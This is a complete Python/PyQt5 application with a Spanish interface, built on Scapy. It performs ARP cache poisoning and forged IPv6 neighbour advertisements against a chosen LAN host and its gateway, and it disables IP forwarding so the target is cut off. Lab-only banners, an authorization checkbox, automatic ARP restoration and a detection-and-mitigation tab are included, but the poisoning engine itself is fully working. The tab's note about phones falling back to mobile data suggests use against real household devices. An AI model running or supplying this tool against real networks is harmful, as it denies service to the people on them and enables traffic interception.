import ipaddress
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime

from PyQt5.QtCore import QThread, Qt, pyqtSignal
from PyQt5.QtGui import QFont
from PyQt5.QtWidgets import (
    QApplication,
    QCheckBox,
    QComboBox,
    QFileDialog,
    QFormLayout,
    QGroupBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMainWindow,
    QMessageBox,
    QPlainTextEdit,
    QPushButton,
    QSpinBox,
    QTabWidget,
    QTextBrowser,
    QVBoxLayout,
    QWidget,
)
from scapy.all import ARP, Ether, IPv6, get_if_addr, get_if_hwaddr, get_if_list, sendp, srp
from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr


def ip_desde_hex(valor):
    try:
        return str(ipaddress.IPv4Address(int.from_bytes(bytes.fromhex(valor), "little")))
    except Exception:
        return "0.0.0.0"


def verificar_raw_socket():
    try:
        sonda = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sonda.close()
        return True, "Raw sockets disponibles para inyección ARP."
    except (PermissionError, OSError) as exc:
        return False, (
            f"Sin permisos para raw sockets ({exc.strerror or exc}). "
            "Ejecuta: sudo -E python3 run.py o aplica cap_net_raw al intérprete."
        )


def descubrir_gateways_ipv6(interfaz):
    try:
        salida = subprocess.check_output(
            ["ip", "-6", "neigh", "show", "dev", interfaz], text=True, timeout=3
        )
    except (OSError, subprocess.SubprocessError):
        return []
    gateways = []
    for linea in salida.splitlines():
        campos = linea.split()
        if "router" not in campos or "lladdr" not in campos:
            continue
        ipv6 = campos[0]
        mac = campos[campos.index("lladdr") + 1]
        if ipv6 not in [entrada[0] for entrada in gateways]:
            gateways.append((ipv6, mac))
    return gateways


IP_FORWARD_ORIGINAL = None


def leer_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", encoding="utf-8") as archivo:
            return archivo.read().strip()
    except OSError:
        return None


def escribir_ip_forward(valor):
    with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="utf-8") as archivo:
        archivo.write(valor + "\n")


def detectar_entorno():
    rutas = {}
    try:
        with open("/proc/net/route", encoding="utf-8") as archivo:
            lineas = archivo.readlines()[1:]
        for linea in lineas:
            campos = linea.split()
            if len(campos) < 8:
                continue
            interfaz = campos[0]
            destino = ip_desde_hex(campos[1])
            gateway = ip_desde_hex(campos[2])
            mascara = ip_desde_hex(campos[7])
            entrada = rutas.setdefault(interfaz, {"gateway": None, "mask": None})
            if destino == "0.0.0.0":
                entrada["gateway"] = gateway
            elif gateway == "0.0.0.0" and mascara != "0.0.0.0":
                entrada["mask"] = mascara
    except OSError:
        pass

    resultado = {}
    for interfaz in get_if_list():
        if interfaz == "lo":
            continue
        try:
            ip_local = get_if_addr(interfaz)
            mac_local = get_if_hwaddr(interfaz)
        except Exception:
            continue
        if not ip_local or ip_local == "0.0.0.0":
            continue
        entrada = rutas.get(interfaz, {})
        mascara = entrada.get("mask") or "255.255.255.0"
        try:
            red = str(ipaddress.ip_network(f"{ip_local}/{mascara}", strict=False))
        except ValueError:
            red = None
        resultado[interfaz] = {
            "ip": ip_local,
            "mac": mac_local,
            "gateway": entrada.get("gateway"),
            "red": red,
        }
    return resultado


class ArpWorker(QThread):
    log = pyqtSignal(str)
    host_encontrado = pyqtSignal(str, str)
    exploracion_finalizada = pyqtSignal(int)
    paquetes_enviados = pyqtSignal(int)
    restaurado = pyqtSignal()
    objetivo_desaparecido = pyqtSignal(str)
    fallo = pyqtSignal(str)

    def __init__(
        self,
        modo,
        interfaz,
        ip_objetivo=None,
        ip_gateway=None,
        mac_atacante=None,
        red=None,
        intervalo=2.0,
        gateways_ipv6=None,
        parent=None,
    ):
        super().__init__(parent)
        self.modo = modo
        self.interfaz = interfaz
        self.ip_objetivo = ip_objetivo
        self.ip_gateway = ip_gateway
        self.mac_atacante = mac_atacante
        self.red = red
        self.intervalo = intervalo
        self.gateways_ipv6 = gateways_ipv6 or []
        self._alta = threading.Event()

    def detener(self):
        self._alta.set()

    def _desactivar_forwarding(self):
        global IP_FORWARD_ORIGINAL
        actual = leer_ip_forward()
        if actual is None:
            self.log.emit("No se pudo leer net.ipv4.ip_forward.")
            return
        if IP_FORWARD_ORIGINAL is None:
            IP_FORWARD_ORIGINAL = actual
        if actual == "1":
            try:
                escribir_ip_forward("0")
                self.log.emit("ip_forward desactivado durante la prueba (estaba en 1).")
            except OSError as exc:
                self.log.emit(f"No se pudo desactivar ip_forward: {exc}")
        else:
            self.log.emit("ip_forward ya estaba desactivado.")

    def _restaurar_forwarding(self):
        global IP_FORWARD_ORIGINAL
        if IP_FORWARD_ORIGINAL is None:
            return
        try:
            escribir_ip_forward(IP_FORWARD_ORIGINAL)
            self.log.emit(f"ip_forward restaurado a {IP_FORWARD_ORIGINAL}.")
            IP_FORWARD_ORIGINAL = None
        except OSError as exc:
            self.log.emit(f"No se pudo restaurar ip_forward: {exc}")

    def run(self):
        try:
            if self.modo == "explorar":
                self._explorar()
            elif self.modo == "atacar":
                self._atacar()
            elif self.modo == "restaurar":
                self._restaurar()
        except Exception as exc:
            self.fallo.emit(f"{type(exc).__name__}: {exc}")

    def _resolver_mac(self, ip, timeout=2):
        respuesta, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=timeout,
            retry=1,
            iface=self.interfaz,
            verbose=0,
        )
        for _, paquete in respuesta:
            return paquete.hwsrc
        return None

    def _explorar(self):
        red = ipaddress.ip_network(self.red, strict=False)
        if red.num_addresses > 65536:
            raise ValueError("La red es demasiado grande para un barrido ARP")
        self.log.emit(f"Barrido ARP en {red} por {self.interfaz}...")
        respuesta, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(red)),
            timeout=2,
            iface=self.interfaz,
            verbose=0,
        )
        vistos = {}
        for _, paquete in respuesta:
            vistos[paquete.psrc] = paquete.hwsrc
        for ip, mac in vistos.items():
            self.host_encontrado.emit(ip, mac)
        self.exploracion_finalizada.emit(len(vistos))

    def _atacar(self):
        mac_objetivo = self._resolver_mac(self.ip_objetivo)
        if not mac_objetivo:
            raise RuntimeError(f"No se resolvió la MAC de {self.ip_objetivo}")
        mac_gateway = self._resolver_mac(self.ip_gateway)
        if not mac_gateway:
            raise RuntimeError(f"No se resolvió la MAC del gateway {self.ip_gateway}")
        self.log.emit(
            f"Objetivo {self.ip_objetivo} [{mac_objetivo}] | "
            f"Gateway {self.ip_gateway} [{mac_gateway}] | Atacante [{self.mac_atacante}]"
        )
        trampa_victima = Ether(dst=mac_objetivo) / ARP(
            op=2,
            hwsrc=self.mac_atacante,
            psrc=self.ip_gateway,
            hwdst=mac_objetivo,
            pdst=self.ip_objetivo,
        )
        trampa_gateway = Ether(dst=mac_gateway) / ARP(
            op=2,
            hwsrc=self.mac_atacante,
            psrc=self.ip_objetivo,
            hwdst=mac_gateway,
            pdst=self.ip_gateway,
        )
        paquetes = [trampa_victima, trampa_gateway]
        if self.gateways_ipv6:
            self.log.emit(
                f"Bloqueo IPv6/NDP activo: {len(self.gateways_ipv6)} gateway(s)"
            )
            paquetes += self._paquetes_ipv6(mac_objetivo, self.mac_atacante)
        self._desactivar_forwarding()
        total = 0
        fallos = 0
        ultimo_chequeo = time.monotonic()
        try:
            while not self._alta.is_set():
                sendp(paquetes, iface=self.interfaz, verbose=0)
                total += len(paquetes)
                self.paquetes_enviados.emit(total)
                self._alta.wait(self.intervalo)
                if time.monotonic() - ultimo_chequeo < 10:
                    continue
                ultimo_chequeo = time.monotonic()
                mac_actual = self._resolver_mac(self.ip_objetivo, timeout=1)
                if mac_actual is None:
                    fallos += 1
                    if fallos >= 2:
                        self.objetivo_desaparecido.emit(
                            f"{self.ip_objetivo} dejó de responder en {self.interfaz}"
                        )
                        break
                    continue
                fallos = 0
                if mac_actual.lower() != mac_objetivo.lower():
                    self.objetivo_desaparecido.emit(
                        f"{self.ip_objetivo} cambió de MAC: "
                        f"{mac_objetivo} -> {mac_actual}"
                    )
                    break
        finally:
            try:
                self._enviar_restauracion(mac_objetivo, mac_gateway)
            finally:
                self._restaurar_forwarding()

    def _paquetes_ipv6(self, mac_objetivo, lladdr):
        paquetes = []
        for ipv6, _ in self.gateways_ipv6:
            paquetes.append(
                Ether(dst=mac_objetivo)
                / IPv6(src=ipv6, dst="ff02::1")
                / ICMPv6ND_NA(tgt=ipv6, R=1, S=0, O=1)
                / ICMPv6NDOptDstLLAddr(lladdr=lladdr)
            )
        return paquetes

    def _restaurar(self):
        mac_objetivo = self._resolver_mac(self.ip_objetivo)
        mac_gateway = self._resolver_mac(self.ip_gateway)
        if not mac_objetivo or not mac_gateway:
            raise RuntimeError("No se pudieron resolver las MAC reales para restaurar")
        try:
            self._enviar_restauracion(mac_objetivo, mac_gateway)
        finally:
            self._restaurar_forwarding()

    def _enviar_restauracion(self, mac_objetivo, mac_gateway):
        self.log.emit("Restaurando tablas ARP con las MAC reales...")
        correctivo_victima = Ether(dst=mac_objetivo) / ARP(
            op=2,
            hwsrc=mac_gateway,
            psrc=self.ip_gateway,
            hwdst=mac_objetivo,
            pdst=self.ip_objetivo,
        )
        correctivo_gateway = Ether(dst=mac_gateway) / ARP(
            op=2,
            hwsrc=mac_objetivo,
            psrc=self.ip_objetivo,
            hwdst=mac_gateway,
            pdst=self.ip_gateway,
        )
        paquetes = [correctivo_victima, correctivo_gateway]
        for ipv6, mac_real in self.gateways_ipv6:
            paquetes.append(
                Ether(dst=mac_objetivo)
                / IPv6(src=ipv6, dst="ff02::1")
                / ICMPv6ND_NA(tgt=ipv6, R=1, S=0, O=1)
                / ICMPv6NDOptDstLLAddr(lladdr=mac_real)
            )
        for _ in range(5):
            sendp(paquetes, iface=self.interfaz, verbose=0)
            self.msleep(300)
        self.restaurado.emit()
        self.log.emit(
            "Restauración enviada. Verifica en la víctima: "
            "arp -a (Windows) o ip neigh show (Linux)"
        )


class VentanaArp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.entorno = {}
        self.hosts = {}
        self.worker = None
        self.total_paquetes = 0
        self.permisos_ok = False
        self.setWindowTitle("ARP Lab | pruebas en red controlada (PyQt5 + Scapy)")
        self.resize(940, 720)
        self._construir_ui()
        self.cargar_entorno()

    def _construir_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)

        self.banner = QLabel()
        self.banner.setWordWrap(True)
        self.banner.setStyleSheet(
            "background:#5a1a1a;color:#ffd9d9;padding:8px;border:1px solid #a33;"
        )
        self.banner.setText(
            "USO EXCLUSIVO EN LABORATORIO AISLADO (red interna/host-only) y con "
            "autorización. Nunca ejecutar en una red de producción o ajena."
        )
        layout.addWidget(self.banner)

        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)

        tab_prueba = QWidget()
        self.tabs.addTab(tab_prueba, "Prueba controlada")
        prueba_layout = QVBoxLayout(tab_prueba)

        grupo_red = QGroupBox("1. Red y gateway")
        formulario_red = QFormLayout(grupo_red)
        self.combo_interfaz = QComboBox()
        self.etiqueta_ip = QLabel("-")
        self.etiqueta_mac = QLabel("-")
        self.campo_gateway = QLineEdit()
        self.etiqueta_red = QLabel("-")
        formulario_red.addRow("Interfaz:", self.combo_interfaz)
        formulario_red.addRow("IP local:", self.etiqueta_ip)
        formulario_red.addRow("MAC local:", self.etiqueta_mac)
        formulario_red.addRow("Gateway (IP):", self.campo_gateway)
        formulario_red.addRow("Subred detectada:", self.etiqueta_red)
        prueba_layout.addWidget(grupo_red)

        fila_red = QHBoxLayout()
        self.boton_detectar = QPushButton("Volver a detectar")
        self.boton_escanear = QPushButton("Escanear hosts (ARP)")
        self.boton_permisos = QPushButton("Reintentar permisos")
        fila_red.addWidget(self.boton_detectar)
        fila_red.addWidget(self.boton_escanear)
        fila_red.addWidget(self.boton_permisos)
        prueba_layout.addLayout(fila_red)

        grupo_objetivo = QGroupBox("2. Objetivo")
        formulario_objetivo = QFormLayout(grupo_objetivo)
        self.combo_hosts = QComboBox()
        self.combo_hosts.setEditable(True)
        self.combo_hosts.setPlaceholderText("IP del objetivo")
        self.etiqueta_mac_objetivo = QLabel("-")
        self.spin_intervalo = QSpinBox()
        self.spin_intervalo.setRange(1, 10)
        self.spin_intervalo.setValue(2)
        self.spin_intervalo.setSuffix(" s")
        self.check_confirmacion = QCheckBox(
            "Confirmo que esta es una red de laboratorio controlada y tengo autorización"
        )
        self.check_ipv6 = QCheckBox("Bloquear también IPv6 (NDP)")
        self.check_ipv6.setChecked(True)
        formulario_objetivo.addRow("Host:", self.combo_hosts)
        formulario_objetivo.addRow("MAC del host:", self.etiqueta_mac_objetivo)
        formulario_objetivo.addRow("Intervalo de envío:", self.spin_intervalo)
        formulario_objetivo.addRow(self.check_confirmacion)
        formulario_objetivo.addRow(self.check_ipv6)
        prueba_layout.addWidget(grupo_objetivo)

        fila_acciones = QHBoxLayout()
        self.boton_iniciar = QPushButton("Iniciar prueba")
        self.boton_detener = QPushButton("Detener y restaurar")
        self.boton_restaurar = QPushButton("Solo restaurar")
        self.boton_detener.setEnabled(False)
        fila_acciones.addWidget(self.boton_iniciar)
        fila_acciones.addWidget(self.boton_detener)
        fila_acciones.addWidget(self.boton_restaurar)
        prueba_layout.addLayout(fila_acciones)

        self.etiqueta_estado = QLabel("Listo")
        prueba_layout.addWidget(self.etiqueta_estado)

        grupo_registro = QGroupBox("3. Registro de evidencia")
        registro_layout = QVBoxLayout(grupo_registro)
        self.registro = QPlainTextEdit()
        self.registro.setReadOnly(True)
        self.registro.setFont(QFont("DejaVu Sans Mono", 9))
        registro_layout.addWidget(self.registro)
        fila_registro = QHBoxLayout()
        self.boton_exportar = QPushButton("Exportar log")
        self.boton_limpiar = QPushButton("Limpiar log")
        fila_registro.addWidget(self.boton_exportar)
        fila_registro.addWidget(self.boton_limpiar)
        registro_layout.addLayout(fila_registro)
        prueba_layout.addWidget(grupo_registro)

        tab_defensa = QTextBrowser()
        tab_defensa.setOpenExternalLinks(False)
        tab_defensa.setHtml(
            "<h2>Detección y defensa</h2>"
            "<p><b>MITRE ATT&amp;CK:</b> T1557.003 — Adversary-in-the-Middle: "
            "ARP Cache Poisoning.</p>"
            "<h3>Antes de ejecutar</h3>"
            "<ol><li>VM con red interna o host-only, nunca modo puente contra la red real.</li>"
            "<li>Autorización por escrito y ventana de prueba definida.</li>"
            "<li>Scapy necesita root o <code>cap_net_raw</code>: "
            "<code>sudo python3 run.py</code>.</li></ol>"
            "<h3>Qué observar en la víctima</h3>"
            "<ul><li><code>arp -a</code> (Windows) / <code>ip neigh show</code> (Linux): "
            "la IP del gateway aparece con la MAC del atacante durante la prueba.</li>"
            "<li>Tras detener, la MAC del gateway debe volver a la del router.</li>"
            "<li>Con ip_forward desactivado, el objetivo pierde conectividad: es un DoS "
            "de capa 2, no una interceptación de payload.</li></ul>"
            "<h3>Qué observar en la red</h3>"
            "<ul><li>Respuestas ARP no solicitadas y repetidas (filtro Wireshark: "
            "<code>arp</code>).</li>"
            "<li>Una misma IP con dos MAC, o la IP del gateway con MAC de host final.</li>"
            "<li>Alertas de <code>arpwatch</code>, <code>arptables</code> o reglas IDS "
            "de duplicados IP/MAC.</li></ul>"
            "<h3>Mitigación</h3>"
            "<ul><li><b>DHCP snooping + DAI</b> en el switch: DAI depende de la tabla "
            "de binding de DHCP snooping; sin ella no valida.</li>"
            "<li>Entradas IP-MAC estáticas en activos críticos y port-security.</li>"
            "<li>802.1X, inspección de ARP gratuitos y monitorización con IDS/IPS.</li></ul>"
            "<h3>Límites de esta herramienta</h3>"
            "<p>Construye tramas ARP (IPv4) y, si se activa la opción, anuncios ICMPv6 "
            "NDP falsos para los gateway de la vecindad. Si net.ipv4.ip_forward está "
            "a 1, lo pone a 0 durante la prueba y restaura el valor original al "
            "detener; de lo contrario el atacante reenviaría el tráfico y la víctima "
            "seguiría con internet. No captura payload ni altera reglas de firewall. "
            "Un único hilo activo a la vez. Si el objetivo deja de responder dos "
            "chequeos seguidos o cambia de MAC, la prueba se detiene sola y restaura "
            "la red.</p>"
            "<p><b>Importante en móviles:</b> si el teléfono tiene datos móviles "
            "activos, puede saltar a 4G/5G cuando detecta que el Wi-Fi no tiene "
            "internet. Eso no se puede evitar desde la LAN: desactiva los datos "
            "móviles o usa el control parental del router/ dispositivo.</p>"
        )
        self.tabs.addTab(tab_defensa, "Detección y defensa")

        self.boton_detectar.clicked.connect(self.cargar_entorno)
        self.boton_permisos.clicked.connect(self.actualizar_preflight)
        self.boton_escanear.clicked.connect(self.escanear)
        self.boton_iniciar.clicked.connect(self.iniciar)
        self.boton_detener.clicked.connect(self.detener)
        self.boton_restaurar.clicked.connect(self.restaurar)
        self.boton_exportar.clicked.connect(self.exportar_registro)
        self.boton_limpiar.clicked.connect(self.registro.clear)
        self.combo_interfaz.currentTextChanged.connect(self._al_cambiar_interfaz)
        self.combo_hosts.currentTextChanged.connect(self._al_cambiar_host)

        self.actualizar_preflight()

    def actualizar_preflight(self):
        self.permisos_ok, detalle = verificar_raw_socket()
        self.banner.setText(
            "USO EXCLUSIVO EN LABORATORIO AISLADO (red interna/host-only) y con "
            "autorización. Nunca ejecutar en una red de producción o ajena.<br>"
            f"<b>Preflight:</b> {detalle}"
        )
        self.boton_escanear.setEnabled(self.permisos_ok)
        self.boton_iniciar.setEnabled(self.permisos_ok)
        self.boton_restaurar.setEnabled(self.permisos_ok)
        self.registrar(f"Preflight: {detalle}")
        return self.permisos_ok

    def registrar(self, texto):
        marca = datetime.now().strftime("%H:%M:%S")
        self.registro.appendPlainText(f"[{marca}] {texto}")
        if self.registro.document().blockCount() > 1000:
            cursor = self.registro.textCursor()
            cursor.movePosition(cursor.MoveType.Start)
            cursor.select(cursor.SelectionType.LineUnderCursor)
            cursor.removeSelectedText()

    def cargar_entorno(self):
        self.entorno = detectar_entorno()
        interfaz_actual = self.combo_interfaz.currentText()
        self.combo_interfaz.clear()
        self.combo_interfaz.addItems(sorted(self.entorno))
        if interfaz_actual in self.entorno:
            self.combo_interfaz.setCurrentText(interfaz_actual)
        if self.combo_interfaz.count() == 0:
            self.registrar("No se detectaron interfaces con IP configurada.")
        self._al_cambiar_interfaz(self.combo_interfaz.currentText())
        self.registrar(f"Entorno detectado: {len(self.entorno)} interfaz(es).")

    def _al_cambiar_interfaz(self, interfaz):
        datos = self.entorno.get(interfaz, {})
        self.etiqueta_ip.setText(datos.get("ip") or "-")
        self.etiqueta_mac.setText(datos.get("mac") or "-")
        self.etiqueta_red.setText(datos.get("red") or "-")
        if datos.get("gateway"):
            self.campo_gateway.setText(datos["gateway"])

    def _al_cambiar_host(self, host):
        self.etiqueta_mac_objetivo.setText(self.hosts.get(host.strip(), "-"))

    def _datos_interfaz(self):
        interfaz = self.combo_interfaz.currentText()
        datos = self.entorno.get(interfaz)
        if not datos:
            QMessageBox.warning(self, "Red", "Selecciona una interfaz válida.")
            return None
        if interfaz == "lo":
            QMessageBox.warning(self, "Red", "La interfaz loopback no es válida.")
            return None
        return interfaz, datos

    def _ip_valida(self, texto):
        try:
            return str(ipaddress.IPv4Address(texto.strip()))
        except ipaddress.AddressValueError:
            return None

    def _validar_objetivo(self, datos, gateway):
        objetivo = self._ip_valida(self.combo_hosts.currentText())
        if not objetivo:
            QMessageBox.warning(self, "Objetivo", "Introduce una IPv4 válida.")
            return None
        if objetivo == gateway or objetivo == datos["ip"]:
            QMessageBox.warning(
                self, "Objetivo", "El objetivo no puede ser el gateway ni esta máquina."
            )
            return None
        if datos.get("red") and ipaddress.ip_address(objetivo) not in ipaddress.ip_network(
            datos["red"]
        ):
            QMessageBox.warning(
                self, "Objetivo", "El objetivo está fuera de la subred detectada."
            )
            return None
        return objetivo

    def _lanzar(self, worker):
        self.worker = worker
        worker.log.connect(self.registrar)
        worker.fallo.connect(self._al_fallo)
        worker.finished.connect(self._al_terminar)
        if hasattr(worker, "host_encontrado"):
            worker.host_encontrado.connect(self._al_host)
        if hasattr(worker, "exploracion_finalizada"):
            worker.exploracion_finalizada.connect(self._al_exploracion_terminada)
        if hasattr(worker, "paquetes_enviados"):
            worker.paquetes_enviados.connect(self._al_paquete)
        if hasattr(worker, "restaurado"):
            worker.restaurado.connect(self._al_restaurado)
        if hasattr(worker, "objetivo_desaparecido"):
            worker.objetivo_desaparecido.connect(self._al_objetivo_desaparecido)
        worker.start()

    def escanear(self):
        if self.worker and self.worker.isRunning():
            QMessageBox.information(self, "Ocupado", "Hay una operación en curso.")
            return
        if not self.actualizar_preflight():
            return
        seleccion = self._datos_interfaz()
        if not seleccion:
            return
        interfaz, datos = seleccion
        if not datos.get("red"):
            QMessageBox.warning(self, "Red", "No se pudo determinar la subred.")
            return
        self.etiqueta_estado.setText("Escaneando hosts...")
        self.boton_escanear.setEnabled(False)
        self._lanzar(
            ArpWorker(
                "explorar", interfaz, red=datos["red"], parent=self
            )
        )

    def _al_host(self, ip, mac):
        self.hosts[ip] = mac
        if self.combo_hosts.findText(ip) < 0:
            self.combo_hosts.addItem(ip)
        self.registrar(f"Host detectado: {ip} [{mac}]")

    def _al_exploracion_terminada(self, cantidad):
        self.etiqueta_estado.setText(f"Escaneo finalizado: {cantidad} host(es)")

    def iniciar(self):
        if self.worker and self.worker.isRunning():
            QMessageBox.information(self, "Ocupado", "Hay una operación en curso.")
            return
        if not self.actualizar_preflight():
            return
        if not self.check_confirmacion.isChecked():
            QMessageBox.warning(
                self,
                "Autorización",
                "Confirma que es una red de laboratorio controlada antes de iniciar.",
            )
            return
        seleccion = self._datos_interfaz()
        if not seleccion:
            return
        interfaz, datos = seleccion
        gateway = self._ip_valida(self.campo_gateway.text())
        if not gateway:
            QMessageBox.warning(self, "Gateway", "Introduce una IPv4 válida para el gateway.")
            return
        objetivo = self._validar_objetivo(datos, gateway)
        if not objetivo:
            return
        self.total_paquetes = 0
        self.etiqueta_estado.setText(f"Envenenando {objetivo} ...")
        self.boton_iniciar.setEnabled(False)
        self.boton_detener.setEnabled(True)
        self.registrar(f"Iniciando prueba controlada contra {objetivo} por {interfaz}.")
        self._lanzar(
            ArpWorker(
                "atacar",
                interfaz,
                ip_objetivo=objetivo,
                ip_gateway=gateway,
                mac_atacante=datos["mac"],
                intervalo=float(self.spin_intervalo.value()),
                gateways_ipv6=(
                    descubrir_gateways_ipv6(interfaz)
                    if self.check_ipv6.isChecked()
                    else []
                ),
                parent=self,
            )
        )

    def detener(self):
        if not self.worker or not self.worker.isRunning():
            return
        self.worker.detener()
        self.boton_detener.setEnabled(False)
        self.etiqueta_estado.setText("Deteniendo y restaurando...")

    def restaurar(self):
        if self.worker and self.worker.isRunning():
            self.detener()
            return
        if not self.actualizar_preflight():
            return
        seleccion = self._datos_interfaz()
        if not seleccion:
            return
        interfaz, _ = seleccion
        gateway = self._ip_valida(self.campo_gateway.text())
        objetivo = self._ip_valida(self.combo_hosts.currentText())
        if not gateway or not objetivo:
            QMessageBox.warning(self, "Datos", "Se requieren IP del objetivo y del gateway.")
            return
        self.etiqueta_estado.setText("Restaurando tablas ARP...")
        self._lanzar(
            ArpWorker(
                "restaurar",
                interfaz,
                ip_objetivo=objetivo,
                ip_gateway=gateway,
                gateways_ipv6=(
                    descubrir_gateways_ipv6(interfaz)
                    if self.check_ipv6.isChecked()
                    else []
                ),
                parent=self,
            )
        )

    def _al_paquete(self, total):
        self.total_paquetes = total
        self.etiqueta_estado.setText(f"Envenenando ... {total} tramas ARP enviadas")

    def _al_restaurado(self):
        self.etiqueta_estado.setText("Restauración completada")

    def _al_objetivo_desaparecido(self, mensaje):
        self.registrar(f"AVISO: {mensaje}. Deteniendo y restaurando la red.")
        self.etiqueta_estado.setText("Objetivo fuera de la red - restaurando")
        self.detener()

    def _al_fallo(self, mensaje):
        self.registrar(f"ERROR: {mensaje}")
        self.etiqueta_estado.setText("Error: revisa el registro")

    def _al_terminar(self):
        self.boton_iniciar.setEnabled(self.permisos_ok)
        self.boton_escanear.setEnabled(self.permisos_ok)
        self.boton_detener.setEnabled(False)

    def exportar_registro(self):
        ruta, _ = QFileDialog.getSaveFileName(
            self, "Exportar registro", "evidencia_arp.txt", "Texto (*.txt)"
        )
        if ruta:
            with open(ruta, "w", encoding="utf-8") as archivo:
                archivo.write(self.registro.toPlainText())
            self.registrar(f"Registro exportado a {ruta}")

    def closeEvent(self, event):
        if self.worker and self.worker.isRunning():
            respuesta = QMessageBox.question(
                self,
                "Salir",
                "Hay una prueba en curso. ¿Detener y restaurar antes de salir?",
                QMessageBox.Yes | QMessageBox.No,
                QMessageBox.Yes,
            )
            if respuesta != QMessageBox.Yes:
                event.ignore()
                return
            self.worker.detener()
            self.worker.wait(10000)
        event.accept()


def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    ventana = VentanaArp()
    ventana.show()
    return app.exec_()
